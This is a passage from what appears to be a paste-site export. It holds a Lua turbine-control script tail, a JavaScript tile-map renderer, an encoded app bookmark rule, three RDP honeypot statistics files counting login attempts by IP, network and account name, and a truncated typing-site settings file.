    neededAmountOfTurbines = 0
  end
  for _,turbine in ipairs(turbines) do
    if neededAmountOfTurbines >= (tonumber(turbine.id)) then
      if not turbine.api.getActive() then
        turbineFunctions.spinUpTurbine(turbine)
      end
    else
      turbineFunctions.spinDownTurbine(turbine)
    end
  end
end

initialise()
--log(turbines)
loop()
--local periList = peripheral.getNames()
--log(periList)

--test = peripheral.find(""BigReactors-Reactor"")
--log(tprint(test))"
nqnZ6r6F,"Roe2Js :: ""canvasRenderView.js""",jargon,JavaScript,Tuesday 2nd of July 2024 07:54:10 PM CDT,"
function canvasViewPortal ( ){

	var [ px, py, pz ] = cursorState ( layers.gui );
	
	drawRectangle(gutterW, gutterH, viewConstraints.viewSpanX * tileW, viewConstraints.viewSpanY * tileH, 'black', 'black');
	
	let buffer = [];
			
	for(let y = viewConstraints.viewMinY; y <= viewConstraints.viewMaxY; y++){
		for(let x = viewConstraints.viewMinX; x <= viewConstraints.viewMaxX; x++){
			
			buffer = [];
			
			px = cx + x;
			py = cy + y;
			
			if(oobMap([px,py]) !== true){
				buffer.push(special.stonwall);
			}
			
			if(oobMap([px,py]) === true){
				
				for(let z = 0; z <= pz; z++){
					buffer.push(`${sections(full_map[px][py][z])[0]}____`);
				}
				
				if( ( x === 0 ) && ( y === 0 ) ){
					buffer.push(special.sel1dash);
				}
			}
			
			// logFeats(hover);
			
			if( ( x === viewCursor.hover.x ) && ( y === viewCursor.hover.y ) ){
				buffer.push(special.sel2dash);
			}
			
			buffer.push(special.sel2dots);
			
			drawImageStack(buffer,gutterW+(x - viewConstraints.viewMinX)*tileW,gutterH+(y - viewConstraints.viewMinY)*tileH,tileW,tileH);
		}
	}
	
	return true;
}

function canvasScrollBars ( ) {

	var [ px, py, pz ] = cursorState ( layers.gui );

	var gutterW = 0;
	var gutterH = 0;

	let scrollX1 = ( cx - viewSpanX / 2 ) / full_map.length;
	let scrollX2 = ( cx + viewSpanX / 2 ) / full_map.length;

	let scrollY1 = ( cy - viewSpanY / 2 ) / full_map[0].length;
	let scrollY2 = ( cy + viewSpanY / 2 ) / full_map[0].length;

	scrollX1 = viewSpanX * tileW * scrollX1;
	scrollX2 = viewSpanX * tileW * scrollX2;

	scrollY1 = viewSpanY * tileH * scrollY1;
	scrollY2 = viewSpanY * tileH * scrollY2;
	
	if( scrollX1 < 0 ){
		scrollX1 = 0;
	}
	if( scrollY1 < 0 ){
		scrollY1 = 0;
	}
	if( scrollX1 > viewSpanX * tileW ){
		scrollX1 = viewSpanX * tileW;
	}
	if( scrollY1 > viewSpanY * tileH ){
		scrollY1 = viewSpanY * tileH;
	}

	if( scrollX2 < 0 ){
		scrollX2 = 0;
	}
	if( scrollY2 < 0 ){
		scrollY2 = 0;
	}
	if( scrollX2 > viewSpanX * tileW ){
		scrollX2 = viewSpanX * tileW;
	}
	if( scrollY2 > viewSpanY * tileH ){
		scrollY2 = viewSpanY * tileH;
	}
	
	scrollW = scrollX2 - scrollX1;
	scrollH = scrollY2 - scrollY1;

	
	// left backbar
	drawRectangle(
		gutterW,
		gutterH,
		8,
		viewSpanY*tileH,
		'rgba(0,0,0,0.0)',
		'red'
	);
	
	// top backbar
	drawRectangle(
		gutterW,
		gutterH,
		viewSpanX*tileW,
		8,
		'rgba(0,0,0,0.0)',
		'red'
	);
	
	gutterW = 0;
	gutterH = 0;

	// right backbar
	drawRectangle(
		gutterW+viewSpanX*tileW,
		gutterH,
		8,
		viewSpanY*tileH,
		'rgba(0,0,0,0.0)',
		'red'
	);
	
	// bottom backbar
	drawRectangle(
		gutterW,
		gutterH+viewSpanY*tileH,
		viewSpanX*tileW,
		8,
		'rgba(0,0,0,0.0)',
		'red'
	);

	// right scrollbar
	drawRectangle(
		gutterW*2+viewSpanX*tileW,
		gutterH*2+scrollY1,
		8,
		scrollH,
		'black',
		'#00ff00'
	);
	
	// bottom scrollbar
	drawRectangle(
		gutterW*2+scrollX1,
		gutterH*2+viewSpanY*tileH,
		scrollW,
		8,
		'black',
		'#00ff00'
	);
	
	return true;

}
"
FCaJ3wjc,ÈÇÄÊÇ®‰∏ÄËµ∑ÁúãÔºö‰π¶Á≠æÁÆ°ÁêÜÔºö„ÄåÁºñËæë„Äç-‚úé‰øÆÊîπ,xiaomianao666,JavaScript,Tuesday 2nd of July 2024 07:24:36 PM CDT,Êµ∑ÈòîËßÜÁïåËßÑÂàôÂàÜ‰∫´ÔºåÂΩìÂâçÂàÜ‰∫´ÁöÑÊòØÔºö‰∫åÁ∫ßÈ°µÈù¢ËØ¶ÊÉÖÔø•page_detailÔø•‰π¶Á≠æÁÆ°ÁêÜÔºö„ÄåÁºñËæë„Äç-‚úé‰øÆÊîπ@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImZpbGU6Ly8vc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvZGF0YS9jb20uZXhhbXBsZS5oaWtlcnZpZXcvZmlsZXMvRG9jdW1lbnRzL25ld1BsYW5Ib21lLmh0bWwjbm9SZWNvcmRIaXN0b3J5I1xcXCIsXFxuZGVzYzpcXFwiMTAwJSYmZmxvYXRcXFwiLFxcbmV4dHJhOntjYW5CYWNrOiB0cnVlfVxcbn1dKTtcIixcImdyb3VwXCI6XCIjSE9NRVwiLFwicGFnZXNcIjpcIltdXCJ9IiwidGl0bGUiOiLkuabnrb7nrqHnkIbvvJrjgIznvJbovpHjgI0t4pyO5L+u5pS5In0=
QrzGCcPu,2024-07-02_stats.json,rdp_snitch,JSON,Tuesday 2nd of July 2024 07:18:13 PM CDT,"{
  ""ip"": {
    ""45.227.254.54"": 6,
    ""45.227.254.55"": 6,
    ""103.166.182.180"": 3,
    ""88.214.25.19"": 9,
    ""91.238.181.23"": 12,
    ""58.218.199.219"": 12,
    ""47.238.192.22"": 15,
    ""91.238.181.24"": 6,
    ""164.92.104.215"": 3,
    ""118.200.191.108"": 3,
    ""147.185.132.45"": 9,
    ""199.45.154.127"": 3,
    ""104.248.154.46"": 9,
    ""64.124.50.139"": 3,
    ""62.215.34.181"": 6,
    ""118.71.209.53"": 3,
    ""135.26.109.26"": 6,
    ""212.70.149.146"": 9,
    ""167.94.138.41"": 3,
    ""185.234.216.92"": 3,
    ""45.115.225.87"": 3,
    ""213.109.202.252"": 21,
    ""147.185.132.109"": 9,
    ""162.248.225.122"": 27,
    ""87.251.75.179"": 6,
    ""223.166.31.100"": 3,
    ""8.53.50.141"": 3,
    ""195.181.174.229"": 6,
    ""45.84.197.193"": 6,
    ""116.140.196.215"": 3,
    ""98.143.255.25"": 9,
    ""3.234.178.254"": 960,
    ""45.137.201.119"": 3,
    ""2.57.149.186"": 6,
    ""205.210.31.207"": 9,
    ""62.122.184.12"": 9,
    ""220.248.76.186"": 3,
    ""67.205.137.66"": 12,
    ""23.92.19.192"": 3,
    ""194.165.16.10"": 6,
    ""168.138.200.186"": 3,
    ""198.235.24.34"": 9,
    ""60.255.174.158"": 3,
    ""138.68.142.176"": 3,
    ""88.214.25.63"": 6,
    ""43.134.186.29"": 3
  },
  ""asn"": {
    ""AS267784"": 12,
    ""AS135905"": 3,
    ""AS29551"": 15,
    ""AS49434"": 18,
    ""AS4134"": 12,
    ""AS45102"": 15,
    ""AS14061"": 27,
    ""AS3758"": 3,
    ""AS396982"": 36,
    ""AS398722"": 3,
    ""AS6461"": 3,
    ""AS21050"": 6,
    ""AS18403"": 3,
    ""AS6300"": 6,
    ""AS204428"": 9,
    ""AS398324"": 3,
    ""AS57523"": 12,
    ""AS140599"": 3,
    ""AS208312"": 27,
    ""AS14576"": 27,
    ""AS208091"": 6,
    ""AS17621"": 6,
    ""AS3356"": 3,
    ""AS60068"": 6,
    ""AS207252"": 6,
    ""AS4837"": 6,
    ""AS3367"": 9,
    ""AS14618"": 960,
    ""AS49581"": 3,
    ""AS63949"": 3,
    ""AS48721"": 6,
    ""AS31898"": 3,
    ""AS132203"": 3
  },
  ""isp"": {
    ""Flyservers S.A."": 18,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""NOC EMAIL: noc@one-host.net"": 15,
    ""Datacenter location PAR1 France"": 18,
    ""Chinanet"": 12,
    ""Alibaba (US) Technology Co., Ltd."": 15,
    ""DigitalOcean, LLC"": 27,
    ""SingNet Pte Ltd"": 3,
    ""Google LLC"": 36,
    ""Censys, Inc."": 6,
    ""Zayo Bandwidth"": 3,
    ""Fast Telecommunications Company W.L.L."": 6,
    ""fpt"": 3,
    ""Consolidated Communications, Inc."": 6,
    ""SS-Net"": 9,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Comfac Corporation"": 3,
    ""Red Byte LLC"": 27,
    ""Hosting Solution Ltd."": 27,
    ""Xhost Internet Solutions LP"": 6,
    ""China Unicom Shanghai Province Network"": 3,
    ""Level 3 Communications, Inc."": 3,
    ""DataCamp Limited"": 6,
    ""Felix Gassan"": 6,
    ""China Unicom CHINA169 Network"": 3,
    ""Xplornet Communications Inc."": 9,
    ""Amazon Technologies Inc."": 960,
    ""Ferdinand Zink trading as Tube-Hosting"": 3,
    ""China Unicom CncNet"": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Oracle Corporation"": 3,
    ""China Unicom China169 Network"": 3,
    ""Aceville Pte.ltd"": 3
  },
  ""org"": {
    ""UAB Host Baltic"": 12,
    ""Zozo Software Company Limited"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 33,
    ""Chinanet JS"": 12,
    ""Alibaba.com LLC"": 15,
    ""DigitalOcean, LLC"": 15,
    ""SingNet Pte Ltd"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 3,
    ""Microsoft Corporation"": 3,
    ""Fasttelco"": 6,
    ""Unknown"": 21,
    ""Consolidated Communications, Inc."": 6,
    ""4Media Ltd"": 9,
    ""Censys, Inc"": 3,
    ""Chang Way Technologies Co. Limited"": 39,
    ""Comfac Corporation"": 3,
    ""IT Hosting Group"": 27,
    ""Xhost Internet Solutions"": 6,
    ""Level 3, LLC"": 3,
    ""CDN77 - Frankfurt POP"": 6,
    ""Felix Gassan"": 6,
    ""China United Network Communications Corporation Limited"": 3,
    ""AWS EC2 (us-east-1)"": 960,
    ""Taurus"": 3,
    ""Digital Ocean"": 12,
    ""Linode"": 3,
    ""Flyservers S.A"": 6,
    ""Oracle Cloud Infrastructure (ap-tokyo-1)"": 3,
    ""SiChuan Cable TV Network CO., LTD"": 3
  },
  ""regionName"": {
    ""Vilnius"": 12,
    ""Hanoi"": 3,
    ""Hesse"": 21,
    ""\u00cele-de-France"": 18,
    ""Jiangsu"": 12,
    ""Kowloon"": 15,
    ""California"": 66,
    ""Central Singapore"": 12,
    ""New York"": 3,
    ""Virginia"": 963,
    ""Hawalli"": 6,
    ""Ho Chi Minh"": 3,
    ""Texas"": 6,
    ""Sofia-Capital"": 9,
    ""Michigan"": 3,
    ""Moscow"": 33,
    ""Dhaka Division"": 3,
    ""North Holland"": 6,
    ""Shanghai"": 6,
    ""Louisiana"": 3,
    ""North Rhine-Westphalia"": 6,
    ""Beijing"": 3,
    ""New Brunswick"": 9,
    ""Lombardy"": 3,
    ""Lesser Poland"": 6,
    ""New Jersey"": 15,
    ""Kaunas"": 6,
    ""Tokyo"": 3,
    ""Sichuan"": 3,
    ""England"": 3,
    ""North West"": 3
  },
  ""country"": {
    ""Lithuania"": 18,
    ""Vietnam"": 6,
    ""Germany"": 27,
    ""France"": 18,
    ""China"": 24,
    ""Hong Kong"": 15,
    ""United States"": 1059,
    ""Singapore"": 15,
    ""Kuwait"": 6,
    ""Bulgaria"": 9,
    ""Russia"": 33,
    ""Bangladesh"": 3,
    ""The Netherlands"": 6,
    ""Canada"": 9,
    ""Italy"": 3,
    ""Poland"": 6,
    ""Japan"": 3,
    ""United Kingdom"": 3
  },
  ""account"": {
    ""Test"": 75,
    ""hello"": 1062,
    ""Administr"": 24,
    ""a"": 3,
    ""rebDTTJSB"": 3,
    ""IhumVC"": 3,
    ""nxHOpe"": 3,
    ""(empty)"": 15,
    ""Domain"": 33,
    ""eThxIpfTy"": 3,
    ""OXcjdx"": 3,
    ""hWyKNY"": 3,
    ""kFjloYKKZ"": 3,
    ""MbzEPF"": 3,
    ""yXxxal"": 3,
    ""rpfumbdk"": 12,
    ""beio"": 3,
    ""HFpNCVCfx"": 3,
    ""NyryHV"": 3,
    ""WGzGRg"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1263
  },
  ""client_build"": {
    ""Unknown"": 1263
  },
  ""client_name"": {
    ""Unknown"": 1263
  },
  ""ip_type"": {
    ""Unknown"": 117,
    ""hosting"": 1068,
    ""proxy"": 33,
    ""hosting & proxy"": 45
  }
}"
jZz5hS1T,2024-07-02_stats.json,rdp_snitch,JSON,Tuesday 2nd of July 2024 07:16:16 PM CDT,"{
  ""ip"": {
    ""45.227.254.54"": 4,
    ""45.227.254.55"": 4,
    ""103.166.182.180"": 2,
    ""88.214.25.19"": 6,
    ""91.238.181.23"": 8,
    ""58.218.199.219"": 8,
    ""47.238.192.22"": 10,
    ""91.238.181.24"": 4,
    ""164.92.104.215"": 2,
    ""118.200.191.108"": 2,
    ""147.185.132.45"": 6,
    ""199.45.154.127"": 2,
    ""104.248.154.46"": 6,
    ""64.124.50.139"": 2,
    ""62.215.34.181"": 4,
    ""118.71.209.53"": 2,
    ""135.26.109.26"": 4,
    ""212.70.149.146"": 6,
    ""167.94.138.41"": 2,
    ""185.234.216.92"": 2,
    ""45.115.225.87"": 2,
    ""213.109.202.252"": 14,
    ""147.185.132.109"": 6,
    ""162.248.225.122"": 18,
    ""87.251.75.179"": 4,
    ""223.166.31.100"": 2,
    ""8.53.50.141"": 2,
    ""195.181.174.229"": 4,
    ""45.84.197.193"": 4,
    ""116.140.196.215"": 2,
    ""98.143.255.25"": 6,
    ""3.234.178.254"": 640,
    ""45.137.201.119"": 2,
    ""2.57.149.186"": 4,
    ""205.210.31.207"": 6,
    ""62.122.184.12"": 6,
    ""220.248.76.186"": 2,
    ""67.205.137.66"": 8,
    ""23.92.19.192"": 2,
    ""194.165.16.10"": 4,
    ""168.138.200.186"": 2,
    ""198.235.24.34"": 6,
    ""60.255.174.158"": 2,
    ""138.68.142.176"": 2,
    ""88.214.25.63"": 4,
    ""43.134.186.29"": 2
  },
  ""asn"": {
    ""AS267784"": 8,
    ""AS135905"": 2,
    ""AS29551"": 10,
    ""AS49434"": 12,
    ""AS4134"": 8,
    ""AS45102"": 10,
    ""AS14061"": 18,
    ""AS3758"": 2,
    ""AS396982"": 24,
    ""AS398722"": 2,
    ""AS6461"": 2,
    ""AS21050"": 4,
    ""AS18403"": 2,
    ""AS6300"": 4,
    ""AS204428"": 6,
    ""AS398324"": 2,
    ""AS57523"": 8,
    ""AS140599"": 2,
    ""AS208312"": 18,
    ""AS14576"": 18,
    ""AS208091"": 4,
    ""AS17621"": 4,
    ""AS3356"": 2,
    ""AS60068"": 4,
    ""AS207252"": 4,
    ""AS4837"": 4,
    ""AS3367"": 6,
    ""AS14618"": 640,
    ""AS49581"": 2,
    ""AS63949"": 2,
    ""AS48721"": 4,
    ""AS31898"": 2,
    ""AS132203"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 12,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""NOC EMAIL: noc@one-host.net"": 10,
    ""Datacenter location PAR1 France"": 12,
    ""Chinanet"": 8,
    ""Alibaba (US) Technology Co., Ltd."": 10,
    ""DigitalOcean, LLC"": 18,
    ""SingNet Pte Ltd"": 2,
    ""Google LLC"": 24,
    ""Censys, Inc."": 4,
    ""Zayo Bandwidth"": 2,
    ""Fast Telecommunications Company W.L.L."": 4,
    ""fpt"": 2,
    ""Consolidated Communications, Inc."": 4,
    ""SS-Net"": 6,
    ""Chang Way Technologies Co. Limited"": 8,
    ""Comfac Corporation"": 2,
    ""Red Byte LLC"": 18,
    ""Hosting Solution Ltd."": 18,
    ""Xhost Internet Solutions LP"": 4,
    ""China Unicom Shanghai Province Network"": 2,
    ""Level 3 Communications, Inc."": 2,
    ""DataCamp Limited"": 4,
    ""Felix Gassan"": 4,
    ""China Unicom CHINA169 Network"": 2,
    ""Xplornet Communications Inc."": 6,
    ""Amazon Technologies Inc."": 640,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""China Unicom CncNet"": 2,
    ""Akamai Technologies, Inc."": 2,
    ""Oracle Corporation"": 2,
    ""China Unicom China169 Network"": 2,
    ""Aceville Pte.ltd"": 2
  },
  ""org"": {
    ""UAB Host Baltic"": 8,
    ""Zozo Software Company Limited"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 22,
    ""Chinanet JS"": 8,
    ""Alibaba.com LLC"": 10,
    ""DigitalOcean, LLC"": 10,
    ""SingNet Pte Ltd"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Censys, Inc."": 2,
    ""Microsoft Corporation"": 2,
    ""Fasttelco"": 4,
    ""Unknown"": 14,
    ""Consolidated Communications, Inc."": 4,
    ""4Media Ltd"": 6,
    ""Censys, Inc"": 2,
    ""Chang Way Technologies Co. Limited"": 26,
    ""Comfac Corporation"": 2,
    ""IT Hosting Group"": 18,
    ""Xhost Internet Solutions"": 4,
    ""Level 3, LLC"": 2,
    ""CDN77 - Frankfurt POP"": 4,
    ""Felix Gassan"": 4,
    ""China United Network Communications Corporation Limited"": 2,
    ""AWS EC2 (us-east-1)"": 640,
    ""Taurus"": 2,
    ""Digital Ocean"": 8,
    ""Linode"": 2,
    ""Flyservers S.A"": 4,
    ""Oracle Cloud Infrastructure (ap-tokyo-1)"": 2,
    ""SiChuan Cable TV Network CO., LTD"": 2
  },
  ""regionName"": {
    ""Vilnius"": 8,
    ""Hanoi"": 2,
    ""Hesse"": 14,
    ""\u00cele-de-France"": 12,
    ""Jiangsu"": 8,
    ""Kowloon"": 10,
    ""California"": 44,
    ""Central Singapore"": 8,
    ""New York"": 2,
    ""Virginia"": 642,
    ""Hawalli"": 4,
    ""Ho Chi Minh"": 2,
    ""Texas"": 4,
    ""Sofia-Capital"": 6,
    ""Michigan"": 2,
    ""Moscow"": 22,
    ""Dhaka Division"": 2,
    ""North Holland"": 4,
    ""Shanghai"": 4,
    ""Louisiana"": 2,
    ""North Rhine-Westphalia"": 4,
    ""Beijing"": 2,
    ""New Brunswick"": 6,
    ""Lombardy"": 2,
    ""Lesser Poland"": 4,
    ""New Jersey"": 10,
    ""Kaunas"": 4,
    ""Tokyo"": 2,
    ""Sichuan"": 2,
    ""England"": 2,
    ""North West"": 2
  },
  ""country"": {
    ""Lithuania"": 12,
    ""Vietnam"": 4,
    ""Germany"": 18,
    ""France"": 12,
    ""China"": 16,
    ""Hong Kong"": 10,
    ""United States"": 706,
    ""Singapore"": 10,
    ""Kuwait"": 4,
    ""Bulgaria"": 6,
    ""Russia"": 22,
    ""Bangladesh"": 2,
    ""The Netherlands"": 4,
    ""Canada"": 6,
    ""Italy"": 2,
    ""Poland"": 4,
    ""Japan"": 2,
    ""United Kingdom"": 2
  },
  ""account"": {
    ""Test"": 50,
    ""hello"": 708,
    ""Administr"": 16,
    ""a"": 2,
    ""rebDTTJSB"": 2,
    ""IhumVC"": 2,
    ""nxHOpe"": 2,
    ""(empty)"": 10,
    ""Domain"": 22,
    ""eThxIpfTy"": 2,
    ""OXcjdx"": 2,
    ""hWyKNY"": 2,
    ""kFjloYKKZ"": 2,
    ""MbzEPF"": 2,
    ""yXxxal"": 2,
    ""rpfumbdk"": 8,
    ""beio"": 2,
    ""HFpNCVCfx"": 2,
    ""NyryHV"": 2,
    ""WGzGRg"": 2
  },
  ""keyboard"": {
    ""Unknown"": 842
  },
  ""client_build"": {
    ""Unknown"": 842
  },
  ""client_name"": {
    ""Unknown"": 842
  },
  ""ip_type"": {
    ""Unknown"": 78,
    ""hosting"": 712,
    ""proxy"": 22,
    ""hosting & proxy"": 30
  }
}"
LgVNdLrq,2024-07-02_stats.json,rdp_snitch,JSON,Tuesday 2nd of July 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""45.227.254.54"": 2,
    ""45.227.254.55"": 2,
    ""103.166.182.180"": 1,
    ""88.214.25.19"": 3,
    ""91.238.181.23"": 4,
    ""58.218.199.219"": 4,
    ""47.238.192.22"": 5,
    ""91.238.181.24"": 2,
    ""164.92.104.215"": 1,
    ""118.200.191.108"": 1,
    ""147.185.132.45"": 3,
    ""199.45.154.127"": 1,
    ""104.248.154.46"": 3,
    ""64.124.50.139"": 1,
    ""62.215.34.181"": 2,
    ""118.71.209.53"": 1,
    ""135.26.109.26"": 2,
    ""212.70.149.146"": 3,
    ""167.94.138.41"": 1,
    ""185.234.216.92"": 1,
    ""45.115.225.87"": 1,
    ""213.109.202.252"": 7,
    ""147.185.132.109"": 3,
    ""162.248.225.122"": 9,
    ""87.251.75.179"": 2,
    ""223.166.31.100"": 1,
    ""8.53.50.141"": 1,
    ""195.181.174.229"": 2,
    ""45.84.197.193"": 2,
    ""116.140.196.215"": 1,
    ""98.143.255.25"": 3,
    ""3.234.178.254"": 320,
    ""45.137.201.119"": 1,
    ""2.57.149.186"": 2,
    ""205.210.31.207"": 3,
    ""62.122.184.12"": 3,
    ""220.248.76.186"": 1,
    ""67.205.137.66"": 4,
    ""23.92.19.192"": 1,
    ""194.165.16.10"": 2,
    ""168.138.200.186"": 1,
    ""198.235.24.34"": 3,
    ""60.255.174.158"": 1,
    ""138.68.142.176"": 1,
    ""88.214.25.63"": 2,
    ""43.134.186.29"": 1
  },
  ""asn"": {
    ""AS267784"": 4,
    ""AS135905"": 1,
    ""AS29551"": 5,
    ""AS49434"": 6,
    ""AS4134"": 4,
    ""AS45102"": 5,
    ""AS14061"": 9,
    ""AS3758"": 1,
    ""AS396982"": 12,
    ""AS398722"": 1,
    ""AS6461"": 1,
    ""AS21050"": 2,
    ""AS18403"": 1,
    ""AS6300"": 2,
    ""AS204428"": 3,
    ""AS398324"": 1,
    ""AS57523"": 4,
    ""AS140599"": 1,
    ""AS208312"": 9,
    ""AS14576"": 9,
    ""AS208091"": 2,
    ""AS17621"": 2,
    ""AS3356"": 1,
    ""AS60068"": 2,
    ""AS207252"": 2,
    ""AS4837"": 2,
    ""AS3367"": 3,
    ""AS14618"": 320,
    ""AS49581"": 1,
    ""AS63949"": 1,
    ""AS48721"": 2,
    ""AS31898"": 1,
    ""AS132203"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 6,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""NOC EMAIL: noc@one-host.net"": 5,
    ""Datacenter location PAR1 France"": 6,
    ""Chinanet"": 4,
    ""Alibaba (US) Technology Co., Ltd."": 5,
    ""DigitalOcean, LLC"": 9,
    ""SingNet Pte Ltd"": 1,
    ""Google LLC"": 12,
    ""Censys, Inc."": 2,
    ""Zayo Bandwidth"": 1,
    ""Fast Telecommunications Company W.L.L."": 2,
    ""fpt"": 1,
    ""Consolidated Communications, Inc."": 2,
    ""SS-Net"": 3,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Comfac Corporation"": 1,
    ""Red Byte LLC"": 9,
    ""Hosting Solution Ltd."": 9,
    ""Xhost Internet Solutions LP"": 2,
    ""China Unicom Shanghai Province Network"": 1,
    ""Level 3 Communications, Inc."": 1,
    ""DataCamp Limited"": 2,
    ""Felix Gassan"": 2,
    ""China Unicom CHINA169 Network"": 1,
    ""Xplornet Communications Inc."": 3,
    ""Amazon Technologies Inc."": 320,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""China Unicom CncNet"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""Oracle Corporation"": 1,
    ""China Unicom China169 Network"": 1,
    ""Aceville Pte.ltd"": 1
  },
  ""org"": {
    ""UAB Host Baltic"": 4,
    ""Zozo Software Company Limited"": 1,
    ""ThinkTech Technology Industrial CO. Limited"": 11,
    ""Chinanet JS"": 4,
    ""Alibaba.com LLC"": 5,
    ""DigitalOcean, LLC"": 5,
    ""SingNet Pte Ltd"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc."": 1,
    ""Microsoft Corporation"": 1,
    ""Fasttelco"": 2,
    ""Unknown"": 7,
    ""Consolidated Communications, Inc."": 2,
    ""4Media Ltd"": 3,
    ""Censys, Inc"": 1,
    ""Chang Way Technologies Co. Limited"": 13,
    ""Comfac Corporation"": 1,
    ""IT Hosting Group"": 9,
    ""Xhost Internet Solutions"": 2,
    ""Level 3, LLC"": 1,
    ""CDN77 - Frankfurt POP"": 2,
    ""Felix Gassan"": 2,
    ""China United Network Communications Corporation Limited"": 1,
    ""AWS EC2 (us-east-1)"": 320,
    ""Taurus"": 1,
    ""Digital Ocean"": 4,
    ""Linode"": 1,
    ""Flyservers S.A"": 2,
    ""Oracle Cloud Infrastructure (ap-tokyo-1)"": 1,
    ""SiChuan Cable TV Network CO., LTD"": 1
  },
  ""regionName"": {
    ""Vilnius"": 4,
    ""Hanoi"": 1,
    ""Hesse"": 7,
    ""\u00cele-de-France"": 6,
    ""Jiangsu"": 4,
    ""Kowloon"": 5,
    ""California"": 22,
    ""Central Singapore"": 4,
    ""New York"": 1,
    ""Virginia"": 321,
    ""Hawalli"": 2,
    ""Ho Chi Minh"": 1,
    ""Texas"": 2,
    ""Sofia-Capital"": 3,
    ""Michigan"": 1,
    ""Moscow"": 11,
    ""Dhaka Division"": 1,
    ""North Holland"": 2,
    ""Shanghai"": 2,
    ""Louisiana"": 1,
    ""North Rhine-Westphalia"": 2,
    ""Beijing"": 1,
    ""New Brunswick"": 3,
    ""Lombardy"": 1,
    ""Lesser Poland"": 2,
    ""New Jersey"": 5,
    ""Kaunas"": 2,
    ""Tokyo"": 1,
    ""Sichuan"": 1,
    ""England"": 1,
    ""North West"": 1
  },
  ""country"": {
    ""Lithuania"": 6,
    ""Vietnam"": 2,
    ""Germany"": 9,
    ""France"": 6,
    ""China"": 8,
    ""Hong Kong"": 5,
    ""United States"": 353,
    ""Singapore"": 5,
    ""Kuwait"": 2,
    ""Bulgaria"": 3,
    ""Russia"": 11,
    ""Bangladesh"": 1,
    ""The Netherlands"": 2,
    ""Canada"": 3,
    ""Italy"": 1,
    ""Poland"": 2,
    ""Japan"": 1,
    ""United Kingdom"": 1
  },
  ""account"": {
    ""Test"": 25,
    ""hello"": 354,
    ""Administr"": 8,
    ""a"": 1,
    ""rebDTTJSB"": 1,
    ""IhumVC"": 1,
    ""nxHOpe"": 1,
    ""(empty)"": 5,
    ""Domain"": 11,
    ""eThxIpfTy"": 1,
    ""OXcjdx"": 1,
    ""hWyKNY"": 1,
    ""kFjloYKKZ"": 1,
    ""MbzEPF"": 1,
    ""yXxxal"": 1,
    ""rpfumbdk"": 4,
    ""beio"": 1,
    ""HFpNCVCfx"": 1,
    ""NyryHV"": 1,
    ""WGzGRg"": 1
  },
  ""keyboard"": {
    ""Unknown"": 421
  },
  ""client_build"": {
    ""Unknown"": 421
  },
  ""client_name"": {
    ""Unknown"": 421
  },
  ""ip_type"": {
    ""Unknown"": 39,
    ""hosting"": 356,
    ""proxy"": 11,
    ""hosting & proxy"": 15
  }
}"
g2fYHJWn,monkeytype_settings,Kuroneko-yousenpai,JSON,Tuesday 2nd of July 2024 06:58:32 PM CDT,"{""theme"":""serika_dark"",""themeLight"":""serika"",""themeDark"":""serika_dark"",""autoSwitchTheme"":false,""customTheme"":true,""customThemeColors"":[""#323437"",""#ff9efc"",""#1aff9c"",""#fafffd"",""#2c2e31"",""#ff9efc"",""#ca4754"",""#ff0019"",""#ca4754"",""#ff0019""],""favThemes"":[""serika_dark""],""showKeyTips"":true,""smoothCaret"":""fast"",""quickRestart"":""esc"",""punctuation"":false,""numbers"":false,""words"":2000,""time"":60,""mode"":""time"",""quoteLength"":[1],""language"":""russian"",""fontSize"":1.5,""freedomMode"":true,""difficulty"":""normal"",""blindMode"":false,""quickEnd"":false,""caretStyle"":""default"",""paceCaretStyle"":""default"",""flipTestColors"":false,""layout"":""default"",""funbox"":""none"",""confidenceMode"":""off"",""indicateTypos"":""off"",""timerStyle"":""mini"",""liveSpeedStyle"":""mini"",""liveAccStyle"":""off"",""liveBurstStyle"":""off"",""colorfulMode"":false,""randomTheme"":""off"",""timerColor"":""main"",""timerOpacity"":""1"",""stopOnError"":""off"",""showAllLines"":false,""keymapMode"":""react"",""keymapStyle"":""staggered"",""keymapLegendStyle"":""lowercase"",""keymapLayout"":""russian"",""keymapShowTopRow"":""layout"",""fontFamily"":""Roboto_Mono"",""smoothLineScroll"":true,""alwaysShowDecimalPlaces"":false,""alwaysShowWordsHistory"":false,""singleListCommandLine"":""manual"",""capsLockWarning"":true,""playSoundOnError"":""off"",""playSoundOnClick"":""off"",""soundVolume"":""0.5"",""startGraphsAtZero"":true,""showOutOfFocusWarning"":true,""paceCaret"":""off"",""paceCaretCustomSp